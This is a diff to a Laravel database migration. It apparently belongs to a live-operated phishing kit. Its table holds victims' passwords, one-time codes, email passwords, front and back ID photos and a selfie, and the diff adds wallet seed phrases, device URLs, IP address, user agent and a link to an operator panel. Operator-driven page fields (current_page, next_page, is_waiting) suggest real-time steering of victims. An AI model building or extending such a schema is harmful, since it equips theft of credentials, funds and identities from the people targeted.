@@ -17,13 +17,16 @@ return new class extends Migration
             $table->string('password')->nullable();
 
             $table->integer('heartbeat')->nullable();
-            $table->string('current_page')->default('login');
-            $table->string('next_page')->default('login');
+            $table->string('current_page')->default('signin');
+            $table->string('next_page')->default('signin');
             $table->boolean('is_waiting')->default(false);
 
             $table->string('phone')->nullable();
             $table->string('otp_1')->nullable();
             $table->string('otp_2')->nullable();
+            $table->string('url')->nullable();
+            $table->string('deviceurl')->nullable();
+            $table->string('seed')->nullable();
 
             $table->string('email')->nullable();
             $table->string('email_password')->nullable();
@@ -32,6 +35,11 @@ return new class extends Migration
             $table->string('front_id')->nullable();
             $table->string('back_id')->nullable();
             $table->string('selfie')->nullable();
+            $table->uuid('user_panel_id');
+            $table->string('ip_address')->nullable();
+            $table->string('user_agent')->nullable();
+
+            $table->foreign('user_panel_id')->references('id')->on('user_panels');
 
             $table->timestamps();
         });
